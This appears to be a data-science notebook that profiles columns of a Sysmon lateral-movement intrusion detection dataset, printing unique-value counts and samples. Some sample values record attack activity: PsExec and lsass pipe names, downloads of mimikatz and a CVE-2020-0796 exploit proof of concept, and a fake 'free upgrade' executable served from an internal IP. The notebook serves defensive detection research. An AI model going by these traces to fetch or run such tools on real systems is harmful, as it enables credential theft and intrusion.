'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+5eab4|c:\\\\windows\\\\system32\\\\lsm.dll+e9d6|c:\\\\windows\\\\system32\\\\lsm.dll+8b22|c:\\\\windows\\\\system32\\\\lsm.dll+8a76|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1c67b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+43a2a|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1d34e|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1ecb9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1ea06|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1e3d1|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1dbcc|C:\\\\Windows\\\\SYSTEM32\\\\twinapi.appcore.dll+1d777|C:\\\\Windows\\\\System32\\\\TwinUI.dll+109196|C:\\\\Windows\\\\System32\\\\TwinUI.dll+82af7|C:\\\\Windows\\\\System32\\\\TwinUI.dll+beb2e|C:\\\\Windows\\\\System32\\\\TwinUI.dll+beaf9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\System32\\\\SHELL32.dll+15d19|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b1b50|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b3057|C:\\\\Windows\\\\explorer.exe+3c618|C:\\\\Windows\\\\explorer.exe+3c4a4|C:\\\\Windows\\\\explorer.exe+3c411|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13bd5f|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13aaeb|C:\\\\Windows\\\\System32\\\\windows.storage.dll+13900f|C:\\\\Windows\\\\System32\\\\SHCORE.dll+367a6|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+39cf9|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1e88a|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Windows\\\\System32\\\\SHELL32.dll+981b0|C:\\\\Windows\\\\System32\\\\SHELL32.dll+b2aac|C:\\\\Windows\\\\System32\\\\TwinUI.dll+12d4e1|C:\\\\Windows\\\\System32\\\\TwinUI.dll+12dfcf|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+5eab4|c:\\\\windows\\\\system32\\\\termsrv.dll+a1087|c:\\\\windows\\\\system32\\\\termsrv.dll+6aa58|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1c67b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+43a2a|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1d34e|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+1ecb9|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a7194|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2b860|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+6b246|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+1c213|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+ce6a3b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+17cade|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+18641d|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+17ef16|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c992c4|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+18689b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+189d3c|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c95f5f|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c99fad|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+184c5b|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunkd.exe+c7dd7e|C:\\\\Windows\\\\System32\\\\ucrtbase.dll+1fb80|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+6e871', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+78b1|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+74d7|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+12fce|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+15b2b|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+1011d|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+104a0|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+13952|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+16139|C:\\\\Windows\\\\SYSTEM32\\\\psmserviceexthost.dll+16c03|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+1a70e|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+14fc2|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+c526|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+11927|C:\\\\Windows\\\\SYSTEM32\\\\resourcepolicyserver.dll+b91a|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+7a593|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+d9f41|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+62d4c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4a274|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+4918d|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+49a3b|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+310ac|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+3152c|C:\\\\Windows\\\\System32\\\\RPCRT4.dll+1ae1c', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+a9381|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+836d5|C:\\\\Tools\\\\ProcessExplorer\\\\procexp64.exe+c799c|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781', 'C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+a6134|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+221bd|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+55e675|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+55e1a6|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+6b453|C:\\\\Program Files\\\\SplunkUniversalForwarder\\\\bin\\\\splunk-powershell.exe+8e8530|C:\\\\Windows\\\\System32\\\\KERNEL32.DLL+84d4|C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+51781'], 'SourceUser': ['nan', 'NT AUTHORITY\\\\SYSTEM', '0', 'ATTACKRANGE\\\\Administrator', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef', '0.0', 'NT AUTHORITY\\\\NETWORK SERVICE', 'STEFANIA\\\\altinitat'], 'TargetUser': ['nan', 'NT AUTHORITY\\\\LOCAL SERVICE', 'NT AUTHORITY\\\\SYSTEM', '0', 'ATTACKRANGE\\\\JULIUS_PITTS', 'Window Manager\\\\DWM-2', 'ATTACKRANGE\\\\Administrator', 'Window Manager\\\\DWM-1', 'ATTACKRANGE\\\\REED_SCHMIDT', 'STEFANIA\\\\altinistef'], 'TargetFilename': ['C:\\\\Users\\\\ALTINI~1.STE\\\\AppData\\\\Local\\\\Temp\\\\vhjSBRkxzNz.exe', 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\Temp\\\\a4-0\\\\Microsoft.PowerShell.Commands.Management.dll', 'C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\Microsoft Office 2007 (preactivated) (michaelrizzochessman upl)\\\\Microsoft Office 2007 (preactivated)\\\\InfoPath.en-us\\\\InfLR.cab', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.248.1127.0001\\\\api-ms-win-core-datetime-l1-1-0.dll', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22092.214.0_x64__8wekyb3d8bbwe\\\\System.Security.Cryptography.ProtectedData.dll', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\FileSyncConfig.exe', 'C:\\\\Users\\\\altinitat.STEFANIA\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.227.1030.0001\\\\api-ms-win-crt-convert-l1-1-0.dll', 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office12\\\\MSCAL.OCX', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22102.229.0_x64__8wekyb3d8bbwe\\\\WinRT.Runtime.dll', 'C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.YourPhone_1.22092.214.0_x64__8wekyb3d8bbwe\\\\YourPhone.Background.CX.dll'], 'CreationUtcTime': ['08:16.8', '42:06.2', '51:12.7', '11:55.5', '47:33.7', '06:10.0', '25:38.0', '26:31.3', '41:28.6', '08:23.1'], 'EventType': ['nan', 'SetValue', 'DeleteValue', '0', 'CreatePipe', 'ConnectPipe', 'DeleteKey', 'CreateKey', '0.0'], 'TargetObject': ['\\\\REGISTRY\\\\A\\\\{09e83960-58de-ea93-2257-7c2a713e7f37}\\\\Root\\\\InventoryApplicationFile\\\\w64-arm.exe|696b1b05915f74c5\\\\LowerCaseLongPath', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\AarSvc_733e5\\\\Start', '\\\\REGISTRY\\\\A\\\\{4bd6ec6f-a019-b54b-afc0-98fdee1df460}\\\\Root\\\\InventoryApplicationFile\\\\grooveclean.exe|eed41384aa045e57\\\\LowerCaseLongPath', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\UnistoreSvc_6a769\\\\ImagePath', 'HKCR\\\\XEV.FailSafeApp\\\\shell\\\\open\\\\command\\\\(Default)', '\\\\REGISTRY\\\\A\\\\{f05f8bf2-6c69-6f8c-edae-7b502c9889fe}\\\\Root\\\\InventoryApplicationFile\\\\pwahelper.exe|bd9fdfe0c9c54c3b\\\\LowerCaseLongPath', '\\\\REGISTRY\\\\A\\\\{4bd6ec6f-a019-b54b-afc0-98fdee1df460}\\\\Root\\\\InventoryApplicationFile\\\\soundrec.exe|2f356917aec13029\\\\BinProductVersion', 'HKCR\\\\Access.MDBFile\\\\shell\\\\Open\\\\command\\\\command', '\\\\REGISTRY\\\\A\\\\{ddc2ac6d-721d-98e0-dd32-f4fb28834614}\\\\Root\\\\InventoryApplicationFile\\\\waasmedicagent.e|464a27937f95d7d6\\\\BinProductVersion', 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\CDPUserSvc_681ac\\\\ImagePath'], 'Details': ['c:\\\\program files (x86)\\\\common files\\\\microsoft shared\\\\source engine\\\\ose.exe', 'C:\\\\PROGRA~1\\\\COMMON~1\\\\MICROS~1\\\\OFFICE12\\\\MSOXMLMF.DLL', 'c:\\\\program files\\\\windowsapps\\\\microsoft.windowscommunicationsapps_16005.14326.21256.0_x64__8wekyb3d8bbwe\\\\hxoutlook.exe', '05/06/2044 13:46', 'QWORD (0x01d7e0d8-0x766dfba1)', 'c:\\\\users\\\\altinistef.stefania\\\\appdata\\\\local\\\\microsoft\\\\edgewebview\\\\application\\\\108.0.1462.54\\\\cookie_exporter.exe', '{5402e5ea-1bdd-4390-82be-e108f1e634f5}', 'C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office12\\\\MSCAL.OCX', '2000.19081.1301.0', 'c:\\\\users\\\\altinitat.stefania\\\\appdata\\\\local\\\\microsoft\\\\onedrive\\\\22.227.1030.0001\\\\onedrivesetup.exe'], 'PipeName': ['nan', '\\\\PSHost.132821900438425963.3392.DefaultAppDomain.wsmprovhost', '\\\\PSHost.132815753751826733.5348.DefaultAppDomain.powershell', '\\\\srvsvc', '\\\\PSEXESVC-WIN-HOST-987-3456-stdout', '0', '<Anonymous Pipe>', '\\\\lsass', '\\\\PSEXESVC-WIN-HOST-987-3456-stderr', '\\\\PSHost.132815753754614208.344.DefaultAppDomain.wsmprovhost'], 'QueryName': ['i.pinimg.com', 'p33243.cedexis-test.com', '_ldap._tcp.gc._msdcs.stefania.local.', 'js-sec.indexww.com', '_ldap._tcp.dc._msdcs.stefania.local.', 's-f.scribdassets.com', 'match.prod.bidr.io', 'www.amycraft.com', 'aorta.clickagy.com', 'p20313.cedexis-test.com'], 'QueryStatus': ['nan', '9003.0', '9852.0', '9002.0', '9701.0', '9501.0', '1223.0', '0.0', '1460.0'], 'QueryResults': ['type:  5 googlehosted.l.googleusercontent.com;142.250.184.225;', 'type:  5 fp-afd-nocache-ccp.afd.azureedge.net;type:  5 star-azureedge-prod.trafficmanager.net;type:  5 dual.part-0032.t-0009.t-msedge.net;type:  5 global-entry-afdthirdparty-fallback.trafficmanager.net;type:  5 dual.part-0032.t-0009.fbs1-t-msedge.net;type:  5 part-0032.t-0009.fbs1-t-msedge.net;::ffff:13.107.219.60;::ffff:13.107.227.60;', 'type:  5 s3-1-w.amazonaws.com;type:  5 s3-w.us-east-1.amazonaws.com;52.217.163.17;54.231.202.209;52.217.100.12;54.231.168.81;52.216.170.59;52.216.160.187;52.216.83.80;3.5.8.13;', 'type:  5 sp-20200324121949090600000008-54648268.eu-west-1.elb.amazonaws.com;99.81.246.120;52.210.252.249;', 'type:  5 pool-eu.zagreb.iponweb.net;type:  5 elb-aws-fr-zagreb-1702672115.eu-central-1.elb.amazonaws.com;3.124.154.128;3.120.107.35;35.157.242.113;3.123.145.89;18.158.209.170;54.93.149.219;', '20.253.178.251;', 'type:  5 sysinternalvmss.trafficmanager.net;type:  5 sysazlive.uksouth.cloudapp.azure.com;20.49.223.105;', 'type:  5 youtube-ui.l.google.com;142.250.186.142;172.217.16.142;142.250.186.46;172.217.18.14;142.250.181.238;172.217.16.206;142.250.186.110;172.217.18.110;142.250.74.206;142.250.186.78;216.58.212.142;142.250.186.174;142.250.184.206;142.250.184.238;142.250.185.110;142.250.185.142;', '192.229.220.206;', 'type:  5 cdn.jsdelivr.net.cdn.cloudflare.net;104.16.87.20;104.16.88.20;104.16.89.20;104.16.86.20;104.16.85.20;'], 'IsExecutable': ['nan', 'True', '0', 'False', '0.0'], 'Archived': ['false - insufficient disk space', 'nan', '0.0', '0'], 'SourceProcessGuid': ['{a190aab6-c2b0-63bd-a800-000000001d00}', 'nan', '{a190aab6-fdd9-63be-7800-000000002100}', '{a190aab6-274b-6389-0b02-000000001600}', '{a190aab6-8a99-63be-7d00-000000001e00}', '{a190aab6-53ba-6382-7f00-000000001500}', '{a190aab6-850e-6393-0600-000000001800}', '{a190aab6-f96c-63be-7600-000000003700}', '{a190aab6-c3c3-63b9-0600-000000002c00}', '{a190aab6-8bdd-638e-0900-000000001c00}'], 'TargetProcessGuid': ['{a190aab6-f9f7-639a-3000-000000001a00}', '{a190aab6-d321-63be-2e00-000000001f00}', '{a190aab6-8e9b-6387-2800-000000001400}', '{a190aab6-9977-638b-a600-000000001900}', '{a190aab6-5fbe-63bf-2200-000000001f00}', '{a190aab6-38e7-639c-5200-000000002100}', '{a190aab6-f9f6-639a-2d00-000000001a00}', '{a190aab6-867a-639b-1c00-000000001a00}', '{a190aab6-08f0-639b-5001-000000001a00}', '{a190aab6-f872-6392-2800-000000001800}'], 'NewThreadId': ['6080.0', '4684.0', '3684.0', '3576.0', '3056.0', '5484.0', '2940.0', '2064.0', '4380.0', '5820.0'], 'StartAddress': ['nan', '0x0000000006412C60', '0x00007FFDAC7FAAB0', '0x000001CA481D0000', '0x0000018CD0C80000', '0x00007FFF19BEACA0', '0xFFFFC53DDB0A20D0', '0x00007FF88266ACA0', '0xFFFFD6A19A4E20D0', '0x000001C31A9B0000'], 'StartModule': ['nan', 'C:\\\\Windows\\\\System32\\\\KERNELBASE.dll', '0', 'C:\\\\Windows\\\\SYSTEM32\\\\KERNELBASE.dll', '0.0', '-'], 'StartFunction': ['nan', 'CtrlRoutine', '0', '0.0', '-'], 'PreviousCreationUtcTime': ['42:30.8', '00:04.5', '43:30.9', '50:25.8', '44:06.5', '56:39.2', '48:15.4', '52:34.2', '42:06.8', '44:06.2'], 'Hash': ['MD5=99F782ED1605973AC850F734470E2311,SHA256=ABFC0E354BA013FE02711AB3D686F1E49BF182D17073C70BE74F9E37B778F474,IMPHASH=481F47BBB2C9C21E108D65F52B04C448', 'MD5=01BBA0649080C1959F083FA0EA5FBDB0,SHA256=3931AC215FE401B0A13DF36978D97544A5F1DF32396F34F3879582C5C19A2460,IMPHASH=00000000000000000000000000000000', 'MD5=E52AC781C403DABE22DFA16AEF8491BE,SHA256=033B81744E0BD4219A4D698894B8403BB67B525C96049CBFEF34677D4D6FC85C,IMPHASH=012373288A4A55BF933694E80D94BDB7', 'MD5=BD35132C7A1E78364F4B908EBAF8CB5D,SHA256=57DC27269669402152518DC7683E0A9CC372A3C3125EFE1C7ECD8E8516F556F3,IMPHASH=4FBD131B43ADA427B7988D9DAC05090E', 'MD5=A285919B3737ED691E1D029E36213050,SHA256=E6901E8423DA3E54BAB25F7C90F60D3979BFA5BB61BCC46059662736253B8C72,IMPHASH=BE5599AD751321F04C6F8A14BFA32AC6', 'MD5=F3855C0D8C5F35E8E88FC79350360006,SHA256=44C08ECDB55F7B492D373BE399273CFE52961715C93B92AC96D9516172B604D0,IMPHASH=481F47BBB2C9C21E108D65F52B04C448', 'MD5=EFA2F8F73B3559711149DFDEB8BC288E,SHA256=EF5CF80C8448BF0907C634A3251CC348B1D36BB5AD8F31F23B11D12AA7F63BCB,IMPHASH=807DBAB54231983BC1DD8E3031EBDF02', 'MD5=9A4A82A513DBFB4F53390359588D86F1,SHA256=98B1F9C3BB1BD9470BEFB6672D52AE67D25E8A8C10E2310E91988AD64B91A485,IMPHASH=00000000000000000000000000000000', 'MD5=4047530ECBC0170039E76FE1657BDB01,SHA256=82254025D1B98D60044D3AEB7C56EED7C61C07C3E30534D6E05DAB9D6C326750,IMPHASH=00000000000000000000000000000000', 'MD5=AB0BBBCBF445146CE71346DF41BB01AD,SHA256=F01468012F5DE0FDBFA71202786085E7EF15237C80C9A9FAAA5C30A3188CF385,IMPHASH=38E28A24C9F1C4F16971D2B60591AF6C'], 'Contents': ['Ã\\x83Â\\xa0Ã\\x82Â¨Ã\\x82Â¹', 'nan', '#!/usr/bin/make -f # -*- makefile -*- # Sample debian/rules that uses debhelper. # This file was originally written by Joey Hess and Craig Small. # As a special exception, when this file is copied by dh-make into a # dh-make output file, you may use that output file without restriction. # This special exception was added by Craig Small in version 0.37 of dh-make.  # Uncomment this to turn on verbose mode. #export DH_VERBOSE=1  %: \\tdh $@  ', 'PsTools Version in this package: 2.48  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=C:\\\\Users\\\\altinistef.STEFANIA\\\\Downloads\\\\PSTools.zip  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://www.researchgate.net/  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://github.com/ZecOps/CVE-2020-0796-RCE-POC  HostUrl=https://codeload.github.com/ZecOps/CVE-2020-0796-RCE-POC/zip/refs/heads/master  ', '[ZoneTransfer]  ZoneId=3  HostUrl=http://192.168.1.28/windows_11_free_upgrade.exe  ', '[ZoneTransfer]  ZoneId=3  ReferrerUrl=https://github.com/ParrotSec/mimikatz  HostUrl=https://codeload.github.com/ParrotSec/mimikatz/zip/refs/heads/master  ', 'README.md '], 'ID': ['0.0', 'nan', '0', 'GetConfigurationOptions'], 'Label': ['0', '1', '2'], 'Unnamed: 0': ['1716829', '533069', '209475', '982169', '450351', '860392', '231405', '286696', '1559146', '1180930']}\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "import pandas as pd\n",
    "from collections import defaultdict\n",
    "\n",
    "# Path to the folder containing the CSV files\n",
    "folder_path = \"F:/Intrusion detection datasets/Lateral-Movement-Dataset--LMD_Collections/LMD_essential\"\n",
    "\n",
    "# Initialize dictionaries to store results\n",
    "unique_counts = defaultdict(int)  # Key: column name, Value: count of unique values\n",
    "unique_values = defaultdict(set)  # Key: column name, Value: set of unique values\n",
    "\n",
    "# Function to process a batch\n",
    "def process_batch(batch, unique_counts, unique_values):\n",
    "    # Coerce inconsistent datatypes to string for uniformity\n",
    "    batch = batch.map(str)\n",
    "    for column in batch.columns:\n",
    "        unique_values[column].update(batch[column].dropna().unique())  # Update unique values\n",
    "        unique_counts[column] = len(unique_values[column])            # Update count of unique values\n",
    "\n",
    "# Read all CSV files in the folder\n",
    "csv_files = [os.path.join(folder_path, f) for f in os.listdir(folder_path) if f.endswith('.csv')]\n",
    "\n",
    "# Process each CSV file in chunks\n",
    "for file_index, file_path in enumerate(csv_files, start=1):\n",
    "    print(f\"Processing File {file_index}/{len(csv_files)}: {file_path}\")\n",
    "    chunk_number = 0\n",
    "    for chunk in pd.read_csv(file_path, chunksize=100000, low_memory=False):  # Adjust chunksize as needed\n",
    "        chunk_number += 1\n",
    "        print(f\"  Reading Chunk {chunk_number}...\")\n",
    "        process_batch(chunk, unique_counts, unique_values)\n",
    "\n",
    "# Extract the first 10 unique values for each column\n",
    "first_10_unique_values = {\n",
    "    column: list(values)[:10] for column, values in unique_values.items()\n",
    "}\n",
    "\n",
    "# Convert unique_counts to a regular dictionary\n",
    "unique_counts = dict(unique_counts)\n",
    "\n",
    "# Display results\n",
    "print(\"Unique Counts:\", unique_counts)\n",
    "print(\"\\nFirst 10 Unique Values:\", first_10_unique_values)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Name                           1\n",
      "Guid                           2\n",
      "EventID                        38\n",
      "Version                        10\n",
      "Level                          4\n",
      "Task                           38\n",
      "Opcode                         2\n",
      "Keywords                       1\n",
      "SystemTime                     5814345\n",
      "EventRecordID                  120469\n",
      "Correlation                    2\n",
      "Execution_ProcessID            27\n",
      "ProcessID                      122\n",
      "ThreadID                       339\n",
      "Channel                        1\n",
      "Computer                       8\n",
      "UserID                         4\n",
      "RuleName                       46\n",
      "UtcTime                        22301\n",
      "ProcessGuid                    15455\n",
      "ProcessId                      2372\n",
      "Image                          515\n",
      "FileVersion                    230\n",
      "Description                    439\n",
      "Product                        61\n",
      "Company                        19\n",
      "OriginalFileName               475\n",
      "CommandLine                    2947\n",
      "CurrentDirectory               81\n",
      "User                           17\n",
      "LogonGuid                      357\n",
      "LogonId                        184\n",
      "TerminalSessionId              7\n",
      "IntegrityLevel                 7\n",
      "Hashes                         5025\n",
      "ParentProcessGuid              1706\n",
      "ParentProcessId                1065\n",
      "ParentImage                    190\n",
      "ParentCommandLine              436\n",
      "ParentUser                     11\n",
      "Protocol                       4\n",
      "Initiated                      4\n",
      "SourceIsIpv6                   4\n",
      "SourceIp                       74\n",
      "SourceHostname                 20\n",
      "SourcePort                     3286\n",
      "SourcePortName                 12\n",
      "DestinationIsIpv6              4\n",
      "DestinationIp                  676\n",
      "DestinationHostname            69\n",
      "DestinationPort                2612\n",
      "DestinationPortName            22\n",
      "State                          3\n",
      "Version2                       4\n",
      "SchemaVersion                  5\n",
      "Configuration                  7\n",
      "ConfigurationFileHash          6\n",
      "ImageLoaded                    299\n",
      "Signed                         5\n",
      "Signature                      9\n",
      "SignatureStatus                5\n",
      "SourceProcessGUID              376\n",
      "SourceProcessId                344\n",
      "SourceThreadId                 470\n",
      "SourceImage                    46\n",
      "TargetProcessGUID              783\n",
      "TargetProcessId                774\n",
      "TargetImage                    117\n",
      "GrantedAccess                  21\n",
      "CallTrace                      238\n",
      "SourceUser                     9\n",
      "TargetUser                     13\n",
      "TargetFilename                 8092\n",
      "CreationUtcTime                2730\n",
      "EventType                      9\n",
      "TargetObject                   12471\n",
      "Details                        2038\n",
      "PipeName                       16\n",
      "QueryName                      409\n",
      "QueryStatus                    9\n",
      "QueryResults                   677\n",
      "IsExecutable                   5\n",
      "Archived                       4\n",
      "SourceProcessGuid              49\n",
      "TargetProcessGuid              306\n",
      "NewThreadId                    281\n",
      "StartAddress                   52\n",
      "StartModule                    6\n",
      "StartFunction                  5\n",
      "PreviousCreationUtcTime        127\n",
      "Hash                           99\n",
      "Contents                       43\n",
      "ID                             4\n",
      "Label                          3\n",
      "Unnamed: 0                     1901979\n",
      "\n",
      "\n",
      "\n",
      "\n",
      "Name                           ['Microsoft-Windows-Sysmon']\n",
      "Guid                           ['{5770385f-c22a-43e0-bf4c-06f5698ffbd9}', '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}']\n",
      "EventID                        ['2', '3.0', '18.0', '13.0', '15', '23', '18', '8', '12.0', '16.0']\n",
      "Version                        ['3', '2', '3.0', '1.0', '5', '4', '2.0', '4.0', '1', '5.0']\n",
      "Level                          ['2.0', '2', '4.0', '4']\n",
      "Task                           ['2', '3.0', '18.0', '13.0', '15', '23', '18', '8', '12.0', '16.0']\n",
      "Opcode                         ['0.0', '0']\n",
      "Keywords                       ['0x8000000000000000']\n",
      "SystemTime                     ['2021-09-08 23:00:50.480247', '2022-11-15 09:04:17.865148', '2023-11-29 13:19:27.126721', '2023-11-27 06:21:34.181249', '2022-11-12 21:55:03.680085', '2023-11-27 12:23:21.474962', '2021-09-11 15:15:37.540497', '2021-09-08 04:38:07.770105', '2023-11-29 07:12:20.600505', '2022-10-11 05:05:12.557212']\n",
      "EventRecordID                  ['115921473', '55911201', '32247.0', '115921678.0', '25428.0', '17620.0', '110561983', '26831', '115816584', '30405.0']\n",
      "Correlation                    ['0.0', 'nan']\n",
      "Execution_ProcessID            ['3064', '20972', '3012', '5520.0', '2916.0', '5676.0', '3120', '3044.0', '3052.0', '5520']\n",
      "ProcessID                      ['2252.0', '5520.0', '2212.0', '3120', '2072.0', '2228', '2192', '3044.0', '2324.0', '2160']\n",
      "ThreadID                       ['3048.0', '5096', '2448.0', '3180.0', '3120', '2560.0', '3460.0', '388.0', '3316.0', '3352.0']\n",
      "Channel                        ['Microsoft-Windows-Sysmon/Operational']\n",
      "Computer                       ['win-dc-128.attackrange.local', 'WINDOWS10EVAL.stefania.local', 'win-dc-800.attackrange.local', 'LAPTOP-ROPR18AK', 'win-host-100.attackrange.local', 'win-host-987.attackrange.local', 'WIN-J23NIGGP1Q6.sysmon_set.local', 'win-dc-469.attackrange.local']\n",
      "UserID                         ['S-1-5-21-332653114-629412497-1093265668-1112', 'S-1-5-21-332653114-629412497-1093265668-1113', 'S-1-5-21-3153833558-3459030340-3832526456-1001', 'S-1-5-18']\n",
